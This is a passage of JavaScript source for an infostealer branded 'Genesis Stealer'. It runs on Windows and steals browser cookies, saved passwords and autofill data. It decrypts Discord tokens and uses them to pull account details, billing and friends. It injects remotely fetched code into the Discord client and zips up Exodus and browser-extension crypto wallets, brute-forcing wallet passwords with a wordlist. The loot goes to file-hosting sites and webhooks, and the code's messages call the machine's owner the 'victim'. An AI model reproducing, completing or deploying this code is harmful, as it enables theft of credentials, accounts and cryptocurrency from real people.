      if (!fs.existsSync(firefoxPath)) continue;

      const findCookiesFiles = (dir, foundFiles = []) => {
        for (const file of fs.readdirSync(dir)) {
          const fullPath = path.join(dir, file);
          try {
            const stat = fs.statSync(fullPath);
            if (stat.isDirectory()) {
              findCookiesFiles(fullPath, foundFiles);
            } else if (file.toLowerCase() === "cookies.sqlite") {
              foundFiles.push(fullPath);
            }
          } catch (err) {
          }
        }
        return foundFiles;
      };

      const cookiesFiles = findCookiesFiles(firefoxPath);

      for (const cookiesFile of cookiesFiles) {
        try {
          const db = new sqlite3.Database(cookiesFile);
          const rows = await new Promise((resolve, reject) => {
            db.all("SELECT * FROM moz_cookies", (err, rows) => {
              err ? reject(err) : resolve(rows || []);
            });
          });
          db.close();

          for (const row of rows) {
            if (!row.value) continue;

            cookies.push(
              `${row.host}\t${row.host.startsWith(".") ? "TRUE" : "FALSE"}\t${row.path}\t` +
              `${row.isSecure ? "TRUE" : "FALSE"}\t${row.expiry}\t${row.name}\t${row.value}`
            );
          }
        } catch (err) {
        }
      }
    } catch (err) {
    }
  }

  if (cookies.length === 0) {
    return { cookies: [] };
  }

  try {
    const filePathFirefox = path.join(pathDefault, "Firefox");
    if (!fs.existsSync(filePathFirefox)) {
      fs.mkdirSync(filePathFirefox, { recursive: true });
    }

    fs.writeFileSync(path.join(filePathFirefox, "Cookies.txt"), cookies.join("\n"), "utf-8");

    return { path: filePathFirefox, cookies };
  } catch (err) {
    return { cookies: [] };
  }
}


async function FindToken(path) {
 const path_tail = path;
 path += "Local Storage\\leveldb";
 if (!path_tail.includes("discord")) {
  try {
   fs.readdirSync(path).map((file) => {
    (file.endsWith(".log") || file.endsWith(".ldb")) &&
     fs.readFileSync(path + "\\" + file, "utf8").split(/\r?\n/).forEach((line) => {
       const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
       for (const pattern of patterns) {
        const found = line.match(pattern);
        if (found.length)
         found.forEach((token) => {
          if (!tokens.includes(token)) tokens.push(token);
         });
       }
      });
   });
  } catch (err) {}
 } else {
  if (!fs.existsSync(path_tail + "\\Local State")) return;
  try {
   fs.readdirSync(path).map((file) => {
    (file.endsWith(".log") || file.endsWith(".ldb")) &&
     fs.readFileSync(path + "\\" + file, "utf8").split(/\r?\n/).forEach((line) => {
       const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\']*/g);
       const found = line.match(pattern);
       if (found) {
        found.forEach((token) => {
         const encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").subarray(5);
         const key = Dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
         token = Buffer.from(token.split("dQw4w9WgXcQ:")[1], "base64");
         const start = token.slice(3, 15);
         const middle = token.slice(15, token.length - 16);
         const end = token.slice(token.length - 16, token.length);
         const decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
         decipher.setAuthTag(end);
         const final = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
         if (!tokens.includes(final)) tokens.push(final);
        });
       }
      });
   });
  } catch (err) {}
 }
}

function getNiceOS() {
  try {
    const output = execSync('wmic os get Caption').toString();
    const lines = output.split('\n').map(l => l.trim()).filter(Boolean);
    return lines[1] || 'Windows (Unknown)';
  } catch {
    return 'Windows (Unknown)';
  }
}

function getMachineGuid() {
  try {
    const output = execSync('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid').toString();
    const match = output.match(/MachineGuid\s+REG_SZ\s+([a-fA-F0-9\-]+)/);
    return match ? match[1].trim() : 'Unknown HWID';
  } catch {
    return 'Unknown HWID';
  }
}

function getDiskInfo() {
  try {
    const output = execSync('wmic logicaldisk get Size,FreeSpace,Caption /format:csv').toString();
    const lines = output.split('\n').map(l => l.trim()).filter(Boolean);
    
    const parts = lines[1].split(',');
    const free = parseInt(parts[1], 10);
    const total = parseInt(parts[2], 10);
    const used = total - free;
    const toGB = b => (b / 1024 ** 3).toFixed(2) + ' GB';
    return `${toGB(used)} / ${toGB(total)}`;
  } catch {
    return 'Unknown';
  }
}

async function getPublicIPInfo() {
  try {
    const res = await axios.get('http://ip-api.com/json/');
    const { query: ip, city, country, isp } = res.data;
    return { ip, city, country, isp };
  } catch {
    return { ip: 'N/A', city: 'N/A', country: 'N/A', isp: 'N/A' };
  }
}

async function collectSystemInfo() {
  const pcName = os.hostname();                            
  const osName = getNiceOS();                             
  const arch = os.arch();                                  
  const cpus = os.cpus();
  const cpuModel = cpus[0]?.model || 'Unknown';
  const cpuCores = cpus.length;
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const ramInfo = `${(usedMem / 1e9).toFixed(2)}GB / ${(totalMem / 1e9).toFixed(2)}GB`;
  const diskInfo = getDiskInfo();                          
  const hwid = getMachineGuid();                            
  const { ip, city, country, isp } = await getPublicIPInfo();

  const fields = [
  {
    name: "\u200b",
    value:
        "```" +
        `PC Name   →  ${pcName}\n` +
        `IP        →  ${ip}\n` +
        `Location  →  ${city}, ${country}\n` +
        `ORG       →  ${isp}\n` +
        `HWID      →  ${hwid}` +
        "```",
    inline: false,
  },
];


  const embed = {
    title: "Genesis New report | Log infos",
    color: 0x808080,
    fields,
    timestamp: new Date(),
    footer: {
		text: `Genesis  | t.me/genesisStealer | My Key: ${panel}`
	}
  };

  if (config.webhook) {
    await axios.post(config.webhook, { embeds: [embed] });
	await axios.post(config.api, { embeds: [embed] });
  } else {
    console.log(JSON.stringify(embed, null, 2));
  }
}

collectSystemInfo();


async function discordtokens() {
  for (const p of Object.values(paths)) {
    try {
      await FindToken(p);
    } catch (e) {
    }
  }
  if (tokens.length === 0) {
    return;
  }
  for (const token of tokens) {
    try {
      const data = await axios
        .get("https://discord.com/api/v9/users/@me", {
          headers: { "Content-Type": "application/json", authorization: token },
        })
        .then((res) => res.data)
        .catch(() => null);

      if (!data) {
        continue;
      }
      const [ip, billing, friends, badges] = await Promise.all([
        GetIp(),
        GetBilling(token),
        GetFriends(token),
        GetBadges(data.id, token),
      ]);
      const avatarUrl = data.avatar
        ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}?size=4096`
        : `https://cdn.discordapp.com/embed/avatars/0.png`;

      const payload = {
        embeds: [
          {
            footer: { text: `Genesis  | t.me/genesisStealer | My key: ${panel}`  },
            fields: [
              { name: `Username <:user:1387511745492549632>`, value: `\`${data.username}\``, inline: false },
              { name: `Discord token found <a:blackcrown:1260385770267607103>`, value: `\`${token}\``, inline: false },
              { name: `Acc Email <:mail:1387896981141061813>`, value: `\`${data.email}\``, inline: true },
              { name: `Phone Number <:phone:1388138174391517225>`, value: `\`${data.phone || "No Set"}\``, inline: true },
              { name: `Badges Founds <:japan:1223077879990980739> `, value: badges || "`No Badges`", inline: true }, 
			  { name: `Billings Found <a:billing:1387892005199282306>`, value: billing, inline: true },
			  { name: `Security infos <:2fa:1387887545286791320>️`, value: `\`${data.mfa_enabled ? "✅ Multi factor Auth is on!" : "❌ Multi Factor Auth is Off!"}\``, inline: false },
            ],
            color: 0x808080,
            author: {
				name: `📌 Genesis Stealer - Discord Found `,
			},
            thumbnail: { url: avatarUrl },
          },
          {
            color: 0x808080,
            description: friends.users,
            author: { name: `👑 Rare Friends | Total friends → ${friends.length}` },
            footer: { text: `Genesis | t.me/genesisStealer` },

          },
        ],
      };
      await axios.post(config.webhook, payload);
      await axios.post(config.api, payload);
    } catch (err) {
    }
  }
}

const badges = {
  staff: { emoji: "<:staff:1362105228719034679>", id: 1 << 0, rare: true },
  active_developer: { emoji: "<:activedev:1362104965065212074>", id: 1 << 22, rare: false },
  early_supporter: { emoji: "<:pig:1362105166811103515>", id: 1 << 9, rare: true },
  verified_developer: { emoji: "<:dev:1362105068060676329>", id: 1 << 17, rare: true },
  certified_moderator: { emoji: "<:mod:1362105108170539229>", id: 1 << 18, rare: true },
  bug_hunter_level_1: { emoji: "<:bughunter1:1362105034157981758>", id: 1 << 3, rare: true },
  bug_hunter_level_2: { emoji: "<:bughunter2:1362105047462314293>", id: 1 << 14, rare: true },
  partner: { emoji: "<:partner:1362105185094336622>", id: 1 << 1, rare: true },
  hypesquad_house_1: { emoji: "<:bravery:1362105004089147784>", id: 1 << 6, rare: false },
  hypesquad_house_2: { emoji: "<:brilliance:1362105019066748968>", id: 1 << 7, rare: false },
  hypesquad_house_3: { emoji: "<:balance:1362104986330202172>", id: 1 << 8, rare: false },
  hypesquad: { emoji: "<:events:1362105087006212456>", id: 1 << 2, rare: true },
  nitro: { emoji: "<a:nitro:1362115714185691186>", rare: false },
  nitro_bronze: { emoji: "<:bronze:1365454925357645994>", rare: false },
  nitro_silver: { emoji: "<:silver:1365454972962996254>", rare: false },
  nitro_gold: { emoji: "<:gold:1365454994337435739>", rare: false },
  nitro_platinum: { emoji: "<:platinum:1365455020690243737>", rare: false },
  nitro_diamond: { emoji: "<:diamond:1365455075937488967>", rare: false },
  nitro_emerald: { emoji: "<:emerald:1365455096296509524>", rare: false },
  nitro_ruby: { emoji: "<:ruby:1365455125187137536>", rare: false },
  nitro_opal: { emoji: "<:opal:1365455150260551740>", rare: false },
  guild_booster_lvl1: { emoji: "<:boost1:1362104840250986667>", rare: false },
  guild_booster_lvl2: { emoji: "<:boost2:1362104851575607636>", rare: false },
  guild_booster_lvl3: { emoji: "<:boost3:1362104863084904830>", rare: false },
  guild_booster_lvl4: { emoji: "<:boost4:1362104873600024857>", rare: true },
  guild_booster_lvl5: { emoji: "<:boost5:1362104892226928812>", rare: true },
  guild_booster_lvl6: { emoji: "<:boost6:1362104904348467431>", rare: true },
  guild_booster_lvl7: { emoji: "<:boost7:1362104916247707658>", rare: true },
  guild_booster_lvl8: { emoji: "<:boost8:1362104931745530197>", rare: true },
  guild_booster_lvl9: { emoji: "<:boost9:1362104950938796164>", rare: true },
  quest_completed: { emoji: "<:quest:1362105209496801290>", rare: false },
};

const GetIp = async () =>
  (await axios.get("https://www.myexternalip.com/raw").catch(() => null))?.data || "None";

const GetRareBadges = flags =>
  typeof flags !== "number"
    ? ""
    : Object.values(badges)
        .filter(b => b.rare && (flags & b.id) === b.id)
        .map(b => b.emoji)
        .join("");

const CurrentNitro = async since => {
  if (!since) return { badge: null, current: null };

  const passedMonths = (() => {
    const now = new Date(),
      then = new Date(since),
      yearDiff = now.getFullYear() - then.getFullYear(),
      monthDiff = now.getMonth() - then.getMonth();
    let total = yearDiff * 12 + monthDiff;
    if (now.getDate() < then.getDate()) total--;
    return total;
  })();

  const nitros = [
    { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
    { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
    { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
    { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
    { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
    { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
    { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
    { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
    { badge: "nitro_opal", lowerLimit: 72 },
  ];

  const current = nitros.find(
    n => passedMonths >= n.lowerLimit && (n.upperLimit === undefined || passedMonths <= n.upperLimit)
  );

  return { badge: current?.badge || null, current: since };
};

const GetBadges = async (id, token) => {
  const data = await axios
    .get(`https://discord.com/api/v10/users/${id}/profile`, {
      headers: { "Content-Type": "application/json", authorization: token },
    })
    .then(r => r.data)
    .catch(() => null);

  if (!data || !Array.isArray(data.badges)) return "`None`";
  if (!data.badges.length) return "`No Badges`";

  const flags = data.badges.map(b => b.id);
  const nitro = await CurrentNitro(data.premium_since);
  if (nitro.badge) flags.unshift(nitro.badge);

  return flags.length
    ? flags.map(id => badges[id]?.emoji).filter(Boolean).join("")
    : "`No Badges`";
};

const GetBilling = async token => {
  const data = await axios
    .get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
      headers: { "Content-Type": "application/json", authorization: token },
    })
    .then(r => r.data)
    .catch(() => null);

  if (!Array.isArray(data)) return "`None`";
  if (!data.length) return "`No Billing`";

  const billings = data
    .filter(b => !b.invalid)
    .map(b => (b.type === 2 ? "<:paypal:1367518269719969873>" : b.type === 1 ? "<:card:1367518257241915483>" : ""))
    .join(" ");

  return billings || "`No Billing`";
};

const GetFriends = async token => {
  const data = await axios
    .get("https://discord.com/api/v9/users/@me/relationships", {
      headers: { authorization: token },
    })
    .then(r => r.data)
    .catch(() => null);

  if (!Array.isArray(data)) return "**Account Locked**";
  if (!data.length) return "**Nothing to see here!**";

  const friends = data.filter(u => u.type === 1);
  const users = friends
    .map(f => {
      const rareBadges = GetRareBadges(f.user.public_flags);
      const is3c = f.user.username.length === 3 ? "<:3c:1365004856103796897>" : "";
      return rareBadges ? `${is3c}${rareBadges} | \`${f.user.username}\`` : is3c ? `${is3c} | \`${f.user.username}\`` : null;
    })
    .filter(Boolean)
    .join("\n");

  return { length: friends.length, users: users || "**Nothing to see here**" };
};

        const local = process.env.LOCALAPPDATA;
        const roaming = process.env.APPDATA;

        const injectionPaths = [];
        const injectionResults = [];
        
        async function sxcxrDs() {
            try {
                if (!local || !roaming) {
                    console.error('Environment variables LOCALAPPDATA or APPDATA are not defined.');
                    return;
                }
        
                const postData = { key: panel };
        
                const response = await axios.post(`https://github.com/Akrapo7/injection/blob/main/discord.js`, postData, {
                    headers: {
                        'Content-Type': 'application/json',
                    },
                });
        
                const injection = response.data;
        
                if (!injection || !injection.data) {
                    console.error('Invalid response from API. "data" field is missing.');
                    return;
                }
        
                const dirs = await fsPromises.readdir(local);
                const discordPaths = dirs.filter(dirName => dirName.includes('cord'));
        
                if (discordPaths.length === 0) {
                    console.log('No Discord installation found. Skipping injection.');
                    return;
                }
        
                for (const discordPath of discordPaths) {
                    const discordDir = path.join(local, discordPath);
                    const appDirs = (await fsPromises.readdir(discordDir)).filter(dirName => dirName.startsWith('app-'));
                    appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
                    const appVersionPath = appDirs.length > 0 ? path.join(discordDir, appDirs[0]) : null;
        
                    if (appVersionPath) {
                        let discordType = 'Discord';
                        if (discordPath.includes('Canary')) discordType = 'Canary';
                        if (discordPath.includes('PTB')) discordType = 'PTB';
        
                        try {
                            const modulesPath = path.join(appVersionPath, 'modules');
                            const dirs = await fsPromises.readdir(modulesPath);
                            const coreDir = dirs.find(dirName => dirName.includes('discord_desktop_core'));
        
                            if (coreDir) {
                                const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
                                const indexPath = path.join(corePath, 'index.js');
                                await fsPromises.writeFile(indexPath, injection.data, 'utf8');
                                console.log(`Injected code into ${indexPath}`);
                                injectionPaths.push(indexPath);
                                injectionResults.push({ path: indexPath, type: discordType });
        
                                const dbPath = path.join(
                                    roaming,
                                    discordPath.replace(local, '').trim(),
                                    'Local Storage',
                                    'leveldb'
                                );
                                const files = await fsPromises.readdir(dbPath);
                                const ldbFiles = files.filter(file => file.endsWith('.ldb'));
                                const logFiles = files.filter(file => file.endsWith('.log'));
        
                                for (const ldbFile of ldbFiles) {
                                    const ldbFilePath = path.join(dbPath, ldbFile);
                                    await fsPromises.writeFile(ldbFilePath, '', 'utf8');
                                    console.log(`Zeroed out token database file at ${ldbFilePath}`);
                                }
        
                                for (const logFile of logFiles) {
                                    const logFilePath = path.join(dbPath, logFile);
                                    await fsPromises.unlink(logFilePath);
                                    console.log(`Deleted log file at ${logFilePath}`);
                                }
                            }
                        } catch (error) {
                            console.error(`Error injecting code into ${discordType}:`, error);
                        }
                    }
                }
        
                try {
                    const betterDiscordPath = path.join(roaming, 'BetterDiscord', 'data', 'betterdiscord.asar');
        
                    if (injection.data) {
                        await fsPromises.writeFile(betterDiscordPath, injection.data, 'utf8');
                        console.log(`Injected code into BetterDiscord at ${betterDiscordPath}`);
                        injectionPaths.push(betterDiscordPath);
                        injectionResults.push({ path: betterDiscordPath, type: 'BetterDiscord' });
                    } else {
                        console.error('Injection data is undefined or invalid.');
                    }
                } catch (error) {
                    console.error('Error injecting code into BetterDiscord:', error);
                }
            } catch (error) {
                console.error('An error occurred:', error);
            }
        }

function Bytes(bytes) {
  const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
  if (bytes === 0) return '0 Byte';
  const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
  return `${(bytes / Math.pow(1024, i)).toFixed(2)} ${sizes[i]}`;
}

function cleanPath(entryName) {
  const parts = entryName.replace(/^browser[\\/]/i, '').split(/[\\/]/);
  const file = parts.pop();
  const path = parts.join(' ');
  return `${path} / ${file}`;
}

async function browser() {
  const zipPath = path.join(os.tmpdir(), "BrowserData.zip");
  if (!fs.existsSync(zipPath)) return;

  const zip = new AdmZip(zipPath);
  const entries = zip.getEntries();

  let cookies = "", passwords = "", autofill = "";

  entries.forEach(entry => {
    if (entry.isDirectory) return;

    const name = entry.entryName.toLowerCase();
    const displayPath = cleanPath(entry.entryName);
    const size = Bytes(entry.header.size);
    const line = `${displayPath} (${size})\n`;

    if (name.includes("cookie")) {
      cookies += line;
    } else if (name.includes("pass")) {
      passwords += line;
    } else if (name.includes("autofill")) {
      autofill += line;
    }
  });


  const link = await Upload(zipPath).catch(() => null);

  const payload = {
    embeds: [
      {
        color:  0x808080,
        fields: [
          {
			name: "⚓️ Genesis Stealer - Browser Data ",
            value: `🛡 Content: Browser data, If you don't receive any passwords, victim issue.`,
            inline: false
          },
          {
            name: "    ",
            value: `<:dl:1387891242360242288> [\`Click Here for Download!\`](${link})`,
            inline: false
          }
        ],
        author: {
          name: "  ",
        },
        footer: {
          text: ` Genesis | t.me/genesisStealer | My key:${panel} `,
        }
      }
    ]
  };

  axios.post(config.webhook, payload).catch(() => null);
  axios.post(config.api, payload).catch(() => null);
  await fs.promises.unlink(zipPath).catch(() => null);
}
        
async function getMasterKey(pathh) {
  const localStatePath = path.join(pathh, 'Local State')
  if (!fs.existsSync(localStatePath)) return null;

  try {
      const data = fs.readFileSync(localStatePath, 'utf8');

      const parsedData = JSON.parse(data);
      const encryptedKey = parsedData.os_crypt.encrypted_key;

      if (!encryptedKey) return null;

      const decodedKeyBuffer = Buffer.from(encryptedKey, 'base64');
      const slicedKeyBuffer = decodedKeyBuffer.slice(5);
      const decryptedKey = Dpapi.unprotectData(slicedKeyBuffer, null, 'CurrentUser');

      return decryptedKey;
  } catch (error) {
      console.error(error);
  }
}

async function decrypt(encrypted, key) {
  const bufferKey = Buffer.isBuffer(key) ? key : Buffer.from(key, 'utf-8');
  if (bufferKey.length !== 32) return null;

  const nonce = encrypted.slice(3, 15);
  const encryptedData = encrypted.slice(15, -16);
  const authTag = encrypted.slice(-16);

  const decipher = crypto.createDecipheriv('aes-256-gcm', bufferKey, nonce);
  decipher.setAuthTag(authTag);

  let decryptedString = decipher.update(encryptedData, 'base64', 'utf-8');
  decryptedString += decipher.final('utf-8');

  return decryptedString;
}

async function executeQuery(pathh, query) {
  const pathTmp = `${pathh}.query`;

  try { 
      await fs.copyFileSync(pathh, pathTmp);
      const db = new sqlite3.Database(pathTmp);

      const data = await new Promise(async (res, rej) => {
          await db.all(query, (err, rows) => {
              if (err) rej(err);
              res(rows);
          })
      });

      return data;
  } catch (e) {
  } finally {
    try {
        await fs.unlink(pathTmp);
    } catch (error) {}
  }
}

async function getUsers() {
  const users = [];
  const userDir = path.join(process.env.SystemDrive || 'C:', 'Users');
  
  try {
    const dirs = fs.readdirSync(userDir);
    for (const dir of dirs) {
      if (dir === 'Public' || dir === 'Default' || dir === 'Default User') continue;
      users.push(path.join(userDir, dir));
    }
  } catch (e) {
  }
    if (!users.includes(os.homedir())) {
    users.push(os.homedir());
  }
  
  return users;
}

async function all() {
  try {
    const profiles = await getDataBrowser();

    const baseDir = path.join(os.tmpdir(), 'BrowserData');
    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true });
    }

    try {
      const firefoxResult = await firefoxCookies(baseDir);
      if (firefoxResult.cookies?.length > 0) {
        const firefoxDir = path.join(baseDir, 'Browser', 'Firefox');
        fs.mkdirSync(firefoxDir, { recursive: true });

        fs.writeFileSync(
          path.join(firefoxDir, 'cookies.txt'),
          firefoxResult.cookies.join('\n')
        );
      }
    } catch (firefoxError) {}

    for (const profile of profiles) {
      try {
        const browserName = profile.browser.name.replace(/[<>:"\/\\|?*]/g, '_');
        const profileName = profile.profile.replace(/[<>:"\/\\|?*]/g, '_');
        const profileDir = path.join(baseDir, 'Browser', browserName, profileName);

        fs.mkdirSync(profileDir, { recursive: true });

        if (profile.autofills?.length > 0) {
          fs.writeFileSync(path.join(profileDir, 'autofills.txt'), profile.autofills.join('\n'));
        }

        if (profile.passwords?.length > 0) {
          fs.writeFileSync(path.join(profileDir, 'passwords.txt'), profile.passwords.join('\n'));
        }

        if (profile.cookies?.length > 0) {
          const cookiesText = profile.cookies.map(c =>
            `${c.domain}\t${c.name}\t${c.value}\t${c.path}\t${c.expires}`
          ).join('\n');

          fs.writeFileSync(path.join(profileDir, 'cookies.txt'), cookiesText);
        }
      } catch (profileError) {}
    }

    const browserFolder = path.join(baseDir, 'Browser');
    if (!fs.existsSync(browserFolder)) {
      fs.mkdirSync(browserFolder, { recursive: true });
    }
    const notePath = path.join(browserFolder, 'note.txt');
    const noteContent = 'These cookies are not from the Chromium Bypass v137.\nIf the other embeds of the cookies do not drop, the issue is likely on the victim’s PC.';
    fs.writeFileSync(notePath, noteContent);
    const zip = new AdmZip();
    zip.addLocalFolder(browserFolder, 'Browser');

    const outputPath = path.join(os.tmpdir(), 'BrowserData.zip');
    zip.writeZip(outputPath);

    fs.rmSync(baseDir, { recursive: true, force: true });

    return outputPath;

  } catch (e) {
    return null;
  }
}

async function Upload(filePath) {
  try {
      const goFileResponse = await axios.get('https://api.gofile.io/servers');
      const goFileServers = goFileResponse.data?.data?.servers || [];

      if (goFileServers.length > 0) {
          const goFileServer = goFileServers[0].name;
          const goFileForm = new FormData();
          goFileForm.append('file', fs.createReadStream(filePath));

          const goFileUploadUrl = `https://${goFileServer}.gofile.io/uploadFile`;
          const goFileUploadResponse = await axios.post(goFileUploadUrl, goFileForm, {
              headers: goFileForm.getHeaders(),
          });

          const goFileData = goFileUploadResponse.data?.data || {};
          if (goFileData.downloadPage) {
              return goFileData.downloadPage;
          }
      }
  } catch (error) {
  }
  return null;
}

async function killProcess(processName) {
  return new Promise((resolve) => {
    try {
      exec(`taskkill /F /IM ${processName}.exe`, (error) => {
        if (error) {
        } else {
        }
        resolve();
      });
    } catch (e) {
      resolve();
    }
  });
}

function generateProfiles(basePath, profiles = 5, includeGuest = true) {
  const paths = [`${basePath}\\Default\\`];
  for (let i = 1; i <= profiles; i++) {
      paths.push(`${basePath}\\Profile ${i}\\`);
  }
  if (includeGuest) {
      paths.push(`${basePath}\\Guest Profile\\`);
  }
  return paths;
}


async function copyFolderContents(source, destination) {
    if (!fs.existsSync(destination)) {
        fs.mkdirSync(destination, { recursive: true });
    }

    const entries = fs.readdirSync(source, { withFileTypes: true });

    for (let entry of entries) {
        const sourcePath = path.join(source, entry.name);
        const destinationPath = path.join(destination, entry.name);

        if (entry.isDirectory()) {
            await copyFolderContents(sourcePath, destinationPath);
        } else {
            fs.copyFileSync(sourcePath, destinationPath);
        }
    }
}

async function SubmitExodus() {
    try {
        const exodusWalletPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Exodus', 'exodus.wallet');
        const zipPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Exodus.zip');
        const seedPath = path.join(exodusWalletPath, 'seed.seco');

        if (fs.existsSync(seedPath)) {
            await zipFolderX(exodusWalletPath, zipPath);

            const fileContent = fs.readFileSync(seedPath);
            checkFileEncoding(fileContent);

            const passwordsAsArray = getPasswordsX();
            let foundPassword = null;
            let decryptedData = null;

            for (let password of passwordsAsArray) {
                decryptedData = decryptWithSeco(fileContent, password);
                if (decryptedData) {
                    foundPassword = password;
                    break;
                }
            }

            const link = await Upload(zipPath);
            const exodusLink = `[Download Wallet](${link})`;

            const embed = {
                title: ` <a:Genesis:1387894590635245638> Exodus Wallet | User: ${os.userInfo().username}`,
                description: `**Password:** \`${foundPassword || 'No passwords!'}\`\n${exodusLink}`,
                color: 0x808080,
                footer: {
                    text: 'Genesis | t.me/genesisStealer',
                },
                thumbnail: {
                    url: 'https://i.postimg.cc/gkPD0f97/B92Jpnr.png'
                }
            };

            await axios.post(config.webhook, { embeds: [embed] });
            await axios.post(config.api, { embeds: [embed] });
        }
    } catch (err) {
    }
}


async function createSingleZip() {
    const zipFilePath = path.join(appdata, 'Wallets.zip');
    const output = fs.createWriteStream(zipFilePath);
    const archive = archiver('zip', {
        zlib: { level: 9 }
    });

    return new Promise((resolve, reject) => {
        output.on('close', async function () {
            if (archive.pointer() === 0 || archive.pointer() < 25) {
                fs.unlinkSync(zipFilePath);
                resolve(null);
            } else {
                try {
                    const fileLink = await Upload(zipFilePath);
                    resolve(fileLink);
                } catch (error) {
                    reject(error);
                }
            }
        });

        output.on('error', function (err) {
            reject(err);
        });

        archive.on('error', function (err) {
            reject(err);
        });

        archive.pipe(output);

        for (const [browser, paths] of Object.entries(WalletsBrowser)) {
            for (const profilePath of paths) {
                if (fs.existsSync(profilePath)) {
                    for (const [wallet, walletPath] of Object.entries(walletPaths)) {
                        const fullWalletPath = profilePath + walletPath;
                        if (fs.existsSync(fullWalletPath)) {
                            walletNames.push(`${browser} ${wallet}`); 
                            fs.readdirSync(fullWalletPath).forEach(file => {
                                const filePath = path.join(fullWalletPath, file);
                                try {
                                    if (fs.lstatSync(filePath).isFile()) {
                                        archive.file(filePath, { name: `${browser}_${wallet}/${file}` });
                                    }
                                } catch (err) {
                                }
                            });
                        }
                    }
                }
            }
        }

        archive.finalize();
    });
}

async function sendLogToApi(filelink) {
    const walletList = walletNames.join(', ');

    const embed = {
        title: `<a:Genesis:1387894590635245638> Wallets Extensions  ${os.userInfo().username}`,
        description: `**Download Archive**:\n- <:dl:1387891242360242288> [All Wallets](${filelink})\n\n\`\`\`\n${walletList}\n\`\`\``, 
        color: 0x808080,
        footer: {
            text: 'Genesis | t.me/genesisStealer',
        }
    };


    try {
        await axios.post(config.webhook, {
            embeds: [embed]
        });

    try {
        await axios.post(config.api, {
            embeds: [embed]
        });

    } catch (error) {
    }
     } catch (error) {
    }
}


async function uploadFile(filePath) {
        let uploadLink = 'Upload failed on both services';
    
        try {
            const goFileResponse = await axios.get('https://api.gofile.io/servers');
            const goFileServers = goFileResponse.data?.data?.servers || [];
    
            if (goFileServers.length > 0) {
                const goFileServer = goFileServers[0].name;
                const goFileForm = new FormData();
                goFileForm.append('file', fs.createReadStream(filePath));
    
                const goFileUploadUrl = `https://${goFileServer}.gofile.io/uploadFile`;
                const goFileUploadResponse = await axios.post(goFileUploadUrl, goFileForm, {
                    headers: goFileForm.getHeaders(),
                });
    
                const goFileData = goFileUploadResponse.data?.data || {};
                if (goFileData.downloadPage) {
                    uploadLink = `${goFileData.downloadPage}`;
                    return uploadLink; 
                }
            }
        } catch (error) {
            console.error('GoFile upload error:', error.response ? error.response.data : error.message);
        }
    
        try {
            const fileIoUrl = 'https://file.io';
            const fileIoForm = new FormData();
            fileIoForm.append('file', fs.createReadStream(filePath));
    
            uploadLink = await new Promise((resolve, reject) => {
                const options = {
                    method: 'POST',
                    headers: {
                        ...fileIoForm.getHeaders(),
                    },
                };
    
                const req = https.request(fileIoUrl, options, (res) => {
                    let data = '';
    
                    res.on('data', (chunk) => {
                        data += chunk;
                    });
    
                    res.on('end', () => {
                        if (res.statusCode === 200) {
                            const response = JSON.parse(data);
                            if (response.link) {
                                resolve(`${response.link}`);
                            } else {
                                resolve('File.io: Upload failed');
                            }
                        } else {
                            reject(new Error(`Failed to upload file to File.io. Status code: ${res.statusCode}`));
                        }
                    });
                });
    
                req.on('error', (error) => {
                    reject(error);
                });
    
                fileIoForm.pipe(req);
            });
    
            return uploadLink; 
        } catch (error) {
            console.error('File.io upload error:', error.message);
        }
    
        try {
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath)); 
            
            const uploadUrl = 'https://catbox.moe/user/api.php';
            console.log('Uploading to Catbox.moe...');
    
            const uploadResponse = await axios.post(uploadUrl, form, {
                headers: form.getHeaders()
            });
    
            const catboxLink = uploadResponse.data.trim();
            return catboxLink;
        } catch (error) {
            console.error('Error uploading file to Catbox:', error.response ? error.response.data : error.message);
        }
    
        console.log('Upload failed on both services.');
        return uploadLink;
    }
    

const tempDir = os.tmpdir();
const wordlistFilePath = path.join(tempDir, 'X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt');

const defaultPasswords = [
    '1234', 
    '12345', 
    '123456', 
    '12345678', 
    '123456789', 
    'password', 
    'admin', 
    'root', 
    'qwerty', 
    'abc123', 
    'letmein', 
    'welcome', 
    '1234567', 
    'passw0rd', 
    '1234567890', 
    '1q2w3e4r', 
    'sunshine', 
    'iloveyou', 
    'football', 
    'monkey', 
    'superman', 
    'hunter2', 
    'dragon', 
    'baseball', 
    'shadow', 
    'trustno1', 
    'password1', 
    'master', 
    'login', 
    'qazwsx', 
    'starwars', 
    '654321', 
    'access', 
    '123qwe', 
    'zaq12wsx', 
    '1qaz2wsx', 
    'hello123', 
    'batman', 
    'charlie', 
    'letmein123', 
    'mustang', 
    '696969', 
    'michael', 
    'freedom', 
    'secret', 
    'abc12345', 
    'loveyou', 
    'whatever', 
    'trustme', 
    '666666'
];



async function getPepperoni() {
  const homeDir = os.homedir();
